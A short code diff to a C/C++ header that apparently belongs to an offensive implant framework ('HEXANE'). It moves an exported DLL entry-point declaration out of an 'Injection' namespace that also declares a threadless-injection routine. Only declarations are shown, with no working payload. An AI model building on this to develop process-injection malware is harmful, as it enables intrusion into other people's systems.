@@ -22,9 +22,9 @@ EXTERN_C LPVOID __Instance;
 #define HEXANE 		        HEXANE_CTX* __LocalInstance = InstancePtr();
 
 EXTERN_C VOID Execute();
+DLL_EXPORT EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
 
 namespace Injection {
-    DLL_EXPORT EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
     VOID Threadless(HMODULE Base);
 
 }
